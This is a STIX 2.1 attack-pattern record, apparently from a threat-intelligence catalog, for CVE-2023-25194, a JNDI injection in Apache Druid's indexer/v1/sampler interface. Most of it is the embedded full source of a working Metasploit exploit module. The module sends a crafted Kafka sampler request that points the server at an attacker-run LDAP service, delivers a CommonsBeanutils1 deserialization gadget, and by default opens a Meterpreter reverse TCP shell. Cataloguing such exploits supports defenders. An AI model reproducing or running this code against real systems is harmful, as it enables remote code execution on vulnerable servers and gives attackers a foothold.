{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--512ae9b1-80f8-435e-9d20-8c9252cfcfed",
    "created": "2024-08-14T17:10:31.605475Z",
    "modified": "2024-08-14T17:10:31.605479Z",
    "name": "Apache Druid JNDI Injection RCE",
    "description": "  This module is designed to exploit the JNDI injection vulnerability in Druid. The vulnerability specifically affects the indexer/v1/sampler interface of Druid, enabling an attacker to execute arbitrary commands on the targeted server.  The vulnerability is found in Apache Kafka clients versions ranging from 2.3.0 to 3.3.2. If an attacker can manipulate the sasl.jaas.config property of any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule it allows the server to establish a connection with the attacker's LDAP server and deserialize the LDAP response. This provides the attacker with the capability to execute java deserialization gadget chains on the Kafka connect server potentially leading to unrestricted deserialization of untrusted data or even remote code execution (RCE) if there are relevant gadgets in the classpath.  To facilitate the exploitation process, this module will initiate an LDAP server that the target server needs to connect to in order to carry out the attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_druid_cve_2023_25194.rb",
            "external_id": "apache_druid_cve_2023_25194.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-25194"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/1529790"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Exploit::Remote::JndiInjection\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'Apache Druid JNDI Injection RCE',\n      'Description' => %q{\n\n        This module is designed to exploit the JNDI injection vulnerability\n        in Druid. The vulnerability specifically affects the indexer/v1/sampler\n        interface of Druid, enabling an attacker to execute arbitrary commands\n        on the targeted server.\n\n        The vulnerability is found in Apache Kafka clients versions ranging from\n        2.3.0 to 3.3.2. If an attacker can manipulate the sasl.jaas.config\n        property of any of the connector's Kafka clients to com.sun.security.auth.module.JndiLoginModule,\n        it allows the server to establish a connection with the attacker's LDAP server\n        and deserialize the LDAP response. This provides the attacker with the capability\n        to execute java deserialization gadget chains on the Kafka connect server,\n        potentially leading to unrestricted deserialization of untrusted data or even\n        remote code execution (RCE) if there are relevant gadgets in the classpath.\n\n        To facilitate the exploitation process, this module will initiate an LDAP server\n        that the target server needs to connect to in order to carry out the attack.\n      },\n      'Author' => [\n        'RedWay Security <info[at]redwaysecurity.com>', # Metasploit module\n        'Jari J\u00e4\u00e4skel\u00e4 <https://github.com/jarijaas>' # discovery\n      ],\n      'References' => [\n        [ 'CVE', '2023-25194' ],\n        [ 'URL', 'https://hackerone.com/reports/1529790'],\n        [ 'URL', 'https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz' ]\n      ],\n      'DisclosureDate' => '2023-02-07',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 8888,\n        'SSL' => true,\n        'SRVPORT' => 3389,\n        'WfsDelay' => 30\n      },\n      'Targets' => [\n        [\n          'Windows', {\n            'Platform' => 'win'\n          },\n        ],\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/python/meterpreter_reverse_tcp'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'Reliability' => [REPEATABLE_SESSION]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    validate_configuration!\n\n    vprint_status('Attempting to trigger the jndi callback...')\n\n    start_service\n    res = trigger\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    retry_until_truthy(timeout: datastore['WfsDelay']) { @search_received }\n\n    return Exploit::CheckCode::Unknown('No LDAP search query was received.') unless @search_received\n\n    report_vuln({\n      host: rhost,\n      port: rport,\n      name: name.to_s,\n      refs: references,\n      info: \"Module #{fullname} found vulnerable host.\"\n    })\n\n    Exploit::CheckCode::Vulnerable\n  ensure\n    cleanup_service\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    return [] unless @exploiting\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('CommonsBeanutils1')\n  end\n\n  def trigger\n    data = {\n      type: 'kafka',\n      spec: {\n        type: 'kafka',\n        ioConfig: {\n          type: 'kafka',\n          consumerProperties: {\n            \"bootstrap.servers\": \"#{Faker::Internet.ip_v4_address}:#{Faker::Number.number(digits: 4)}\",\n            \"sasl.mechanism\": 'SCRAM-SHA-256',\n            \"security.protocol\": 'SASL_SSL',\n            \"sasl.jaas.config\": \"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\\"#{jndi_string}\\\" useFirstPass=\\\"true\\\" serviceName=\\\"#{Rex::Text.rand_text_alphanumeric(5)}\\\" debug=\\\"true\\\" group.provider.url=\\\"#{Rex::Text.rand_text_alphanumeric(5)}\\\";\"\n          },\n          topic: Rex::Text.rand_text_alpha(8..12).to_s,\n          useEarliestOffset: true,\n          inputFormat: { type: 'regex', pattern: '([\\\\s\\\\S]*)', listDelimiter: (SecureRandom.uuid.gsub('-', '')[0..20]).to_s, columns: ['raw'] }\n        },\n        dataSchema: { dataSource: Rex::Text.rand_text_alphanumeric(5..10).to_s, timestampSpec: { column: Rex::Text.rand_text_alphanumeric(5..10).to_s, missingValue: DateTime.now.utc.iso8601.to_s }, dimensionsSpec: {}, granularitySpec: { rollup: false } },\n        tuningConfig: { type: 'kafka' }\n      },\n      samplerConfig: { numRows: 500, timeoutMs: 15000 }\n    }\n\n    @search_received = false\n\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri, '/druid/indexer/v1/sampler') + '?for=connect',\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => data.to_json\n    )\n  end\n\n  def exploit\n    validate_configuration!\n    @exploiting = true\n    start_service\n    res = trigger\n    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?\n    fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way') unless res.code == 400\n\n    retry_until_truthy(timeout: datastore['WfsDelay']) { @search_received && (!handler_enabled? || session_created?) }\n    handler\n  ensure\n    cleanup\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-07",
    "x_mitre_platforms": [
        "unix'"
    ]
}